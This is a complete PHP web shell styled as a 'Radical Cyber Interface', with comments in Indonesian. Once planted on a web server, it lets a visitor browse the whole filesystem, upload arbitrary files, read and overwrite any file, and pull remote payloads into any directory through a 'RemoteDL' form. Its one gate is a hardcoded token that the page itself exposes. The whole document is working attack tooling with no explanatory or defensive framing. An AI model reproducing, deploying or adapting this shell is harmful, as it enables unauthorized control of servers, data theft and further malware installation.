<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>Sh3ll – Radical Cyber Interface</title>
<style>
body{
  background:radial-gradient(circle at top,#060012 0%,#010009 100%);
  color:#d7d8f5;
  font-family:"JetBrains Mono",monospace;
  margin:0;padding:0;
}
a{color:#59d6ff;text-decoration:none;}
a:hover{color:#ae7bff;}
h2{color:#a96eff;text-shadow:0 0 8px #803fff;text-align:center;margin-top:15px;}
h3{color:#bba8ff;text-shadow:0 0 6px #7a4cff;font-weight:600;margin:8px 0;}
table{
  width:95%;border-collapse:collapse;margin:20px auto;
  background:rgba(15,10,35,0.9);
  border:1px solid rgba(110,80,255,0.3);
  box-shadow:0 0 15px rgba(110,60,255,0.3);
}
th{background:linear-gradient(90deg,#16003a,#0a001f);color:#aee7ff;padding:10px;text-transform:uppercase;font-size:13px;}
td{
  padding:8px 10px;border-top:1px solid rgba(255,255,255,0.05);
  background:rgba(20,10,40,0.4);transition:background .2s ease;
}
tr:hover td{background:rgba(140,60,255,0.2);box-shadow:inset 0 0 8px rgba(160,90,255,0.3);}
.perm-777 { color:#00f0ff; text-shadow:0 0 6px #00eaff; font-weight:bold; }
.perm-644 { color:#59d6ff; text-shadow:0 0 6px #59d6ff; }
.perm-444 { color:#ffffff; text-shadow:0 0 3px #888; }
.perm-other { color:#a589ff; text-shadow:0 0 5px #6f40ff; }
form{margin:10px auto;background:rgba(25,10,45,0.6);padding:12px;border-radius:6px;width:fit-content;box-shadow:0 0 10px rgba(130,70,255,0.3);}
input,select,textarea{
  background:#0c0c18;color:#cce3ff;border:1px solid rgba(160,90,255,0.4);
  border-radius:5px;padding:8px;font-family:inherit;
}
input[type=submit],.up,.gas{
  background:linear-gradient(180deg,#150035,#09001a);
  color:#cce8ff;border:1px solid #7540ff;border-radius:5px;padding:6px 10px;
  cursor:pointer;text-shadow:0 0 5px #6c3aff;transition:all .2s ease;
}
input[type=submit]:hover,.up:hover,.gas:hover{
  background:linear-gradient(180deg,#290090,#0b0033);box-shadow:0 0 8px #8a50ff;
}
pre{background:#0a0616;color:#b5caff;padding:10px;border-radius:6px;overflow:auto;box-shadow:inset 0 0 10px rgba(150,80,255,0.3);}
ul{list-style:none;text-align:center;padding:0;margin:15px 0;}
ul a{color:#ae7bff;}
.center{text-align:center;}
</style>
</head>
<body>
<?php
define('REMOTE_DL_TOKEN','cyber2025');
set_time_limit(0);error_reporting(0);

// ================= PERMISSION COLOR ===================
function statusnya($f){
    $p=@fileperms($f);if($p===false)return'?';
    $t=[0xC000=>'s',0xA000=>'l',0x8000=>'-',0x4000=>'d'][$p&0xF000]??'?';
    $m=[0x0100,0x0080,0x0040,0x0020,0x0010,0x0008,0x0004,0x0002,0x0001];
    foreach($m as $i=>$b){$t.=($p&$b)?(['r','w','x','r','w','x','r','w','x'][$i]):'-';}
    return$t;
}

function perm_color($path){
    $perm = substr(sprintf('%o', @fileperms($path)), -4);
    $txt = statusnya($path);
    if ($perm === '0777') return "<span class='perm-777'>$txt</span>";
    if ($perm === '0644') return "<span class='perm-644'>$txt</span>";
    if ($perm === '0444') return "<span class='perm-444'>$txt</span>";
    return "<span class='perm-other'>$txt</span>";
}
// ======================================================

function xrmdir($d){$it=@scandir($d);if(!$it)return;foreach($it as $i){if($i=='.'||$i=='..')continue;$p="$d/$i";if(is_dir($p))xrmdir($p);else@unlink($p);}rmdir($d);}

function __download_secure($url, $optname=''){
  // Simpan file di direktori yang sedang dibuka (dari UI)
  $base = isset($_GET['path']) && is_dir($_GET['path']) ? realpath($_GET['path']) : getcwd();
  $cwdBackup = getcwd(); // simpan cwd lama

  @chdir($base); // pindah sementara

  if (!filter_var($url, FILTER_VALIDATE_URL))
    return ['ok'=>false,'err'=>'Invalid URL','path'=>null];

  $basename = basename(parse_url($url, PHP_URL_PATH) ?? 'file.bin');
  $basename = preg_replace('/[^A-Za-z0-9._-]/','_',$basename);
  $filename = $optname
    ? preg_replace('/[^A-Za-z0-9._-]/','_',basename($optname))
    : $basename;

  $target = $base . DIRECTORY_SEPARATOR . $filename;
  $ok=false;$err='';

  if (function_exists('curl_init')) {
    $ch=curl_init($url);$fp=@fopen($target,'w');
    if($fp){
      curl_setopt_array($ch,[
        CURLOPT_FILE=>$fp,
        CURLOPT_FOLLOWLOCATION=>true,
        CURLOPT_TIMEOUT=>90,
        CURLOPT_FAILONERROR=>true
      ]);
      curl_exec($ch);
      $cerr=curl_error($ch);
      $code=curl_getinfo($ch,CURLINFO_HTTP_CODE);
      curl_close($ch);fclose($fp);
      if(!$cerr && $code<400 && is_file($target)) $ok=true;
      else{@unlink($target);$err=$cerr?:("HTTP ".$code);}
    }else $err='Write fail';
  }

  if(!$ok){
    $data=@file_get_contents($url);
    if($data!==false && @file_put_contents($target,$data)!==false)
      $ok=true;
    else $err=$err?:'Download failed';
  }

  if($ok)@chmod($target,0644);

  // Kembalikan working directory
  @chdir($cwdBackup);

  // Path relatif untuk tampilan
  $relative = str_replace($cwdBackup, '.', realpath($target));

  return ['ok'=>$ok,'err'=>$err,'path'=>$relative];
}


function alfaremotedl(){
  echo"<div style='background:#0b0b10;padding:14px;border-radius:8px;margin:15px auto;max-width:950px;box-shadow:0 0 10px rgba(110,70,255,0.3);'>";
  echo"<h3>Upload From URL (secure)</h3>";
  echo"<form method='post'><label>Cmd (download &lt;url&gt; [filename])</label><br>
  <input type='text' name='cmd' placeholder='download https://example.com/file.ext optional_name.ext'
   style='width:95%;max-width:900px;padding:10px 12px;border-radius:6px;background:#0b0b18;color:#bfefff;
   border:1px solid rgba(160,90,255,0.4);font-family:monospace;font-size:14px;' required>
  <input type='hidden' name='dl_token' value='".REMOTE_DL_TOKEN."'>
  <div style='margin-top:8px;'><input type='submit' name='dl_submit' value='Download'></div></form>";
  if($_SERVER['REQUEST_METHOD']==='POST'&&isset($_POST['dl_submit'])){
    $cmd=trim($_POST['cmd']);$t=$_POST['dl_token'];
    echo"<div style='margin-top:10px;padding:8px;background:#090919;border-radius:4px;'>";
    if($t!==REMOTE_DL_TOKEN)echo"<div style='color:#f66'>Auth failed.</div>";
    else{
      $p=preg_split('/\s+/',$cmd,3);
      if(count($p)<2||strtolower($p[0])!=='download')echo"<div style='color:#f66'>Use: download &lt;url&gt; [filename]</div>";
      else{$r=__download_secure($p[1],$p[2]??'');
        echo $r['ok']?"<div style='color:#7f6'>Success: ".htmlspecialchars($r['path'])."</div>":"<div style='color:#f66'>Error: ".htmlspecialchars($r['err'])."</div>";}
    }
    echo"</div>";
  }
  echo"<div style='color:#888;font-size:12px;margin-top:8px;'>Current dir: ".htmlspecialchars(getcwd())."</div></div>";
}

$lokasi=isset($_GET['path'])?$_GET['path']:getcwd();
$lokasi=str_replace('\\','/',$lokasi);
$lokasis=@explode('/',$lokasi);
$lokasinya=@scandir($lokasi);

echo"<h2>Sh3ll – Cyber Edition</h2>";
echo"<div class='center'>Directory: ";
foreach($lokasis as $i=>$l){
  if($l==''&&$i==0){echo"<a href='?path=/'>/</a>";continue;}
  if($l=='')continue;
  echo"<a href='?path=";for($x=0;$x<=$i;$x++){echo rawurlencode($lokasis[$x]);if($x!=$i)echo"/";}echo"'>$l</a>/";}
echo"</div><ul><li>[ <a href='?'>Home</a> ] [ <a href='?act=remotedl'>RemoteDL</a> ]</li></ul>";

if(isset($_GET['act'])&&$_GET['act']==='remotedl'){alfaremotedl();exit;}

if(isset($_POST['upload'])){
  $file=$_FILES['berkas']['name'];
  $dst="$lokasi/".basename($file);
  if(move_uploaded_file($_FILES['berkas']['tmp_name'],$dst))
    echo"<center><span style='color:#6f6'>Upload success: ".htmlspecialchars($file)."</span></center>";
  else echo"<center><span style='color:#f66'>Upload failed.</span></center>";
}
echo"<form enctype='multipart/form-data' method='post'>
<input type='file' name='berkas' required>
<input type='submit' name='upload' value='Upload'>
</form>";

if(isset($_GET['edit'])){
  $p=$_GET['edit'];
  if(isset($_POST['save'])){
    file_put_contents($p,$_POST['src']);
    echo"<center><span style='color:#6f6'>Saved.</span></center>";
  }
  echo"<form method='post'><textarea name='src' cols='100' rows='25'>".htmlspecialchars(@file_get_contents($p))."</textarea><br>
  <input type='submit' name='save' value='Save'></form>";
  exit;
}

echo'<table><tr><th>Name</th><th>Size</th><th>Perm</th><th>Action</th></tr>';
foreach($lokasinya as $f){
  if($f=='.'||$f=='..')continue;
  $p="$lokasi/$f";
  if(is_dir($p)){
    echo"<tr><td><a href='?path=".urlencode($p)."'>$f</a></td><td>--</td><td>".perm_color($p)."</td>
    <td><a href='?rename=".urlencode($p)."'>rename</a> | <a href='?delete=".urlencode($p)."'>delete</a></td></tr>";
  } else {
    $s=round(@filesize($p)/1024,2).' KB';
    echo"<tr><td><a href='?edit=".urlencode($p)."'>$f</a></td><td>$s</td><td>".perm_color($p)."</td>
    <td><a href='?download=".urlencode($p)."'>download</a> | <a href='?rename=".urlencode($p)."'>rename</a> | <a href='?delete=".urlencode($p)."'>delete</a></td></tr>";
  }
}
echo'</table>';
?>
</body>
</html>
